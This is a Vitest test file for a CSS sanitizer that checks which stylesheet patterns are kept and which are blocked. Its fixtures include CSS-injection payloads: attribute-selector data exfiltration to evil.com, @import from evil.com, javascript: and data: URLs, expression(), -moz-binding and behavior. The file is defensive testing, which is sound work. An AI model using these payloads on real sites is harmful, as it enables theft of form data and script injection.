import { describe, it, expect } from 'vitest';
import { sanitizeCss, isValidCss } from './cssSanitizer';

describe('sanitizeCss', () => {
  // -------------------------------------------------------------------------
  // Safe CSS patterns (should be preserved)
  // -------------------------------------------------------------------------
  describe('safe CSS patterns', () => {
    it('preserves basic CSS rules', () => {
      const css = '.hero { color: red; background: blue; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves pseudo-classes', () => {
      const css = 'a:hover { color: blue; } button:focus { outline: 2px solid; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves pseudo-elements', () => {
      const css = 'p::before { content: "→"; } div::after { content: ""; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves ID and class selectors', () => {
      const css = '#header { height: 60px; } .button { padding: 10px; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves type selectors and combinators', () => {
      const css = 'div > p { margin: 0; } h1 + p { margin-top: 0; } li ~ li { border-top: 1px solid; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves color values and gradients', () => {
      const css = '.gradient { background: linear-gradient(to right, #ff0000, #00ff00); color: rgba(0, 0, 0, 0.5); }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('preserves transforms and animations', () => {
      const css = '.animated { transform: rotate(45deg); transition: all 0.3s ease; animation: spin 2s infinite; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('handles empty string', () => {
      expect(sanitizeCss('')).toBe('');
    });

    it('handles whitespace-only string', () => {
      expect(sanitizeCss('   \n\t  ')).toBe('');
    });
  });

  // -------------------------------------------------------------------------
  // @import rules (should be blocked)
  // -------------------------------------------------------------------------
  describe('@import rules', () => {
    it('blocks @import with url()', () => {
      const css = '@import url("https://evil.com/style.css");';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: @import');
      expect(sanitized).not.toContain('@import url');
    });

    it('blocks @import with string', () => {
      const css = '@import "https://evil.com/style.css";';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: @import');
      expect(sanitized).not.toContain('@import "');
    });

    it('blocks multiple @import rules', () => {
      const css = '@import url("a.css"); @import url("b.css");';
      const sanitized = sanitizeCss(css);
      expect(sanitized.match(/BLOCKED: @import/g)).toHaveLength(2);
    });

    it('blocks @import with various whitespace', () => {
      const css = '@import  \t  url("evil.css");';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: @import');
    });
  });

  // -------------------------------------------------------------------------
  // Attribute selectors (should be blocked - data exfiltration)
  // -------------------------------------------------------------------------
  describe('attribute selectors', () => {
    it('blocks attribute selectors with ^= (starts with)', () => {
      const css = 'input[value^="pass"] { background: red; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[value^=');
      expect(sanitized).toBe('input { background: red; }');
    });

    it('blocks attribute selectors with $= (ends with)', () => {
      const css = 'input[name$="token"] { color: blue; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[name$=');
      expect(sanitized).toBe('input { color: blue; }');
    });

    it('blocks attribute selectors with *= (contains)', () => {
      const css = 'input[value*="secret"] { display: none; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[value*=');
      expect(sanitized).toBe('input { display: none; }');
    });

    it('blocks attribute selectors with = (exact match)', () => {
      const css = 'input[type="password"] { background: red; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[type=');
      expect(sanitized).toBe('input { background: red; }');
    });

    it('blocks attribute selectors with |= and ~=', () => {
      const css = '[lang|="en"] { color: red; } [class~="active"] { font-weight: bold; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[lang|=');
      expect(sanitized).not.toContain('[class~=');
    });

    it('blocks multiple attribute selectors in one rule', () => {
      const css = 'input[type="text"][value^="a"] { color: red; }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[type=');
      expect(sanitized).not.toContain('[value^=');
      expect(sanitized).toBe('input { color: red; }');
    });
  });

  // -------------------------------------------------------------------------
  // url() with javascript: protocol (should be blocked)
  // -------------------------------------------------------------------------
  describe('url() with javascript:', () => {
    it('blocks url() with javascript: protocol', () => {
      const css = '.evil { background: url(javascript:alert(1)); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: javascript');
      expect(sanitized).not.toContain('javascript:alert');
    });

    it('blocks url() with javascript: and quotes', () => {
      const css = '.evil { background: url("javascript:alert(1)"); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: javascript');
      expect(sanitized).not.toContain('javascript:alert');
    });

    it('blocks url() with javascript: and single quotes', () => {
      const css = ".evil { background: url('javascript:void(0)'); }";
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: javascript');
      expect(sanitized).not.toContain('javascript:void');
    });

    it('blocks url() with javascript: and whitespace', () => {
      const css = '.evil { background: url(  javascript:alert(1)  ); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: javascript');
      expect(sanitized).not.toContain('javascript:alert');
    });
  });

  // -------------------------------------------------------------------------
  // url() with data: protocol (should be blocked)
  // -------------------------------------------------------------------------
  describe('url() with data:', () => {
    it('blocks url() with data: protocol', () => {
      const css = '.evil { background: url(data:text/html,<script>alert(1)</script>); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: data');
      expect(sanitized).not.toContain('data:text/html');
    });

    it('blocks url() with data: and base64', () => {
      const css = '.evil { background: url("data:image/png;base64,iVBORw0KGgo="); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: data');
      expect(sanitized).not.toContain('data:image');
    });

    it('blocks url() with data: and quotes', () => {
      const css = ".evil { background: url('data:text/css,body{background:red}'); }";
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: data');
      expect(sanitized).not.toContain('data:text');
    });
  });

  // -------------------------------------------------------------------------
  // url() with external http/https URLs (should be blocked)
  // -------------------------------------------------------------------------
  describe('url() with external URLs', () => {
    it('blocks url() with https:// URLs', () => {
      const css = '.evil { background: url(https://evil.com/exfiltrate?data=); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: external');
      expect(sanitized).not.toContain('https://evil.com');
    });

    it('blocks url() with http:// URLs', () => {
      const css = '.evil { background: url(http://evil.com/steal); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: external');
      expect(sanitized).not.toContain('http://evil.com');
    });

    it('blocks url() with external URLs and quotes', () => {
      const css = '.evil { background: url("https://evil.com/leak"); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: external');
      expect(sanitized).not.toContain('https://evil.com');
    });

    it('blocks multiple external URLs', () => {
      const css = '.a { background: url(https://a.com); } .b { background: url(http://b.com); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized.match(/BLOCKED: external/g)).toHaveLength(2);
      expect(sanitized).not.toContain('https://a.com');
      expect(sanitized).not.toContain('http://b.com');
    });
  });

  // -------------------------------------------------------------------------
  // CSS expressions (should be blocked - IE-specific JavaScript)
  // -------------------------------------------------------------------------
  describe('CSS expressions', () => {
    it('blocks expression() function', () => {
      const css = '.evil { width: expression(alert(1)); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: expression');
      expect(sanitized).not.toContain('expression(alert');
    });

    it('blocks expression() with whitespace', () => {
      const css = '.evil { width: expression  (document.body.clientWidth); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: expression');
      expect(sanitized).not.toContain('expression  (');
    });

    it('blocks multiple expressions', () => {
      const css = '.a { width: expression(1); } .b { height: expression(2); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized.match(/BLOCKED: expression/g)).toHaveLength(2);
    });
  });

  // -------------------------------------------------------------------------
  // -moz-binding (should be blocked - Firefox XBL)
  // -------------------------------------------------------------------------
  describe('-moz-binding', () => {
    it('blocks -moz-binding property', () => {
      const css = '.evil { -moz-binding: url(xbl.xml#myBinding); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: -moz-binding');
      expect(sanitized).not.toContain('-moz-binding: url');
    });

    it('blocks -moz-binding with whitespace', () => {
      const css = '.evil { -moz-binding  :  url(xbl.xml); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: -moz-binding');
      expect(sanitized).not.toContain('-moz-binding  :');
    });
  });

  // -------------------------------------------------------------------------
  // behavior property (should be blocked - IE HTC)
  // -------------------------------------------------------------------------
  describe('behavior property', () => {
    it('blocks behavior property', () => {
      const css = '.evil { behavior: url(script.htc); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: behavior');
      expect(sanitized).not.toContain('behavior: url');
    });

    it('blocks behavior with whitespace', () => {
      const css = '.evil { behavior  :  url(evil.htc); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: behavior');
      expect(sanitized).not.toContain('behavior  :');
    });
  });

  // -------------------------------------------------------------------------
  // Complex attack scenarios
  // -------------------------------------------------------------------------
  describe('complex attack scenarios', () => {
    it('blocks data exfiltration via attribute selector + external URL', () => {
      const css = 'input[value^="a"] { background: url(https://evil.com/leak?a); }';
      const sanitized = sanitizeCss(css);
      expect(sanitized).not.toContain('[value^=');
      expect(sanitized).not.toContain('https://evil.com');
      expect(sanitized).toContain('BLOCKED: external');
    });

    it('blocks multiple attack vectors in one stylesheet', () => {
      const css = `
        @import url("https://evil.com/style.css");
        input[value^="pass"] { background: url(https://evil.com/leak); }
        .evil { behavior: url(evil.htc); }
        .xss { background: url(javascript:alert(1)); }
      `;
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('BLOCKED: @import');
      expect(sanitized).toContain('BLOCKED: external');
      expect(sanitized).toContain('BLOCKED: behavior');
      expect(sanitized).toContain('BLOCKED: javascript');
      expect(sanitized).not.toContain('[value^=');
      expect(sanitized).not.toContain('https://evil.com');
    });

    it('preserves safe CSS while blocking dangerous patterns', () => {
      const css = `
        .safe { color: red; background: blue; }
        .evil { background: url(https://evil.com); }
        .also-safe { font-size: 16px; }
      `;
      const sanitized = sanitizeCss(css);
      expect(sanitized).toContain('.safe { color: red; background: blue; }');
      expect(sanitized).toContain('.also-safe { font-size: 16px; }');
      expect(sanitized).toContain('BLOCKED: external');
      expect(sanitized).not.toContain('https://evil.com');
    });
  });

  // -------------------------------------------------------------------------
  // Edge cases
  // -------------------------------------------------------------------------
  describe('edge cases', () => {
    it('handles null input', () => {
      expect(sanitizeCss(null as any)).toBe('');
    });

    it('handles undefined input', () => {
      expect(sanitizeCss(undefined as any)).toBe('');
    });

    it('handles non-string input', () => {
      expect(sanitizeCss(123 as any)).toBe('');
      expect(sanitizeCss({} as any)).toBe('');
      expect(sanitizeCss([] as any)).toBe('');
    });

    it('trims leading and trailing whitespace', () => {
      const css = '  .hero { color: red; }  ';
      expect(sanitizeCss(css)).toBe('.hero { color: red; }');
    });

    it('handles unicode characters', () => {
      const css = '.عربي { color: red; } .中文 { font-size: 16px; }';
      expect(sanitizeCss(css)).toBe(css);
    });

    it('handles very long CSS strings', () => {
      const css = '.a { color: red; } '.repeat(1000);
      const sanitized = sanitizeCss(css);
      expect(sanitized).toBe(css.trim());
    });

    it('handles CSS with comments', () => {
      const css = '/* This is a comment */ .hero { color: red; }';
      expect(sanitizeCss(css)).toBe(css);
    });
  });
});

describe('isValidCss', () => {
  // -------------------------------------------------------------------------
  // Valid CSS (should return true)
  // -------------------------------------------------------------------------
  describe('valid CSS', () => {
    it('returns true for safe CSS rules', () => {
      expect(isValidCss('.hero { color: red; }')).toBe(true);
    });

    it('returns true for pseudo-classes', () => {
      expect(isValidCss('a:hover { color: blue; }')).toBe(true);
    });

    it('returns true for pseudo-elements', () => {
      expect(isValidCss('p::before { content: "→"; }')).toBe(true);
    });

    it('returns true for empty string', () => {
      expect(isValidCss('')).toBe(true);
    });

    it('returns true for complex safe CSS', () => {
      const css = `
        .hero {
          color: red;
          background: linear-gradient(to right, #ff0000, #00ff00);
          transform: rotate(45deg);
        }
        .button:hover { opacity: 0.8; }
      `;
      expect(isValidCss(css)).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // Invalid CSS (should return false)
  // -------------------------------------------------------------------------
  describe('invalid CSS', () => {
    it('returns false for @import rules', () => {
      expect(isValidCss('@import url("evil.css");')).toBe(false);
    });

    it('returns false for attribute selectors', () => {
      expect(isValidCss('input[value^="a"] { }')).toBe(false);
    });

    it('returns false for url() with javascript:', () => {
      expect(isValidCss('.evil { background: url(javascript:alert(1)); }')).toBe(false);
    });

    it('returns false for url() with data:', () => {
      expect(isValidCss('.evil { background: url(data:text/html,<script>); }')).toBe(false);
    });

    it('returns false for url() with external URLs', () => {
      expect(isValidCss('.evil { background: url(https://evil.com); }')).toBe(false);
    });

    it('returns false for CSS expressions', () => {
      expect(isValidCss('.evil { width: expression(alert(1)); }')).toBe(false);
    });

    it('returns false for -moz-binding', () => {
      expect(isValidCss('.evil { -moz-binding: url(xbl.xml); }')).toBe(false);
    });

    it('returns false for behavior property', () => {
      expect(isValidCss('.evil { behavior: url(evil.htc); }')).toBe(false);
    });

    it('returns false when mixed with safe CSS', () => {
      const css = '.safe { color: red; } .evil { background: url(https://evil.com); }';
      expect(isValidCss(css)).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Edge cases
  // -------------------------------------------------------------------------
  describe('edge cases', () => {
    it('returns true for null input', () => {
      expect(isValidCss(null as any)).toBe(true);
    });

    it('returns true for undefined input', () => {
      expect(isValidCss(undefined as any)).toBe(true);
    });

    it('returns true for non-string input', () => {
      expect(isValidCss(123 as any)).toBe(true);
      expect(isValidCss({} as any)).toBe(true);
      expect(isValidCss([] as any)).toBe(true);
    });
  });
});
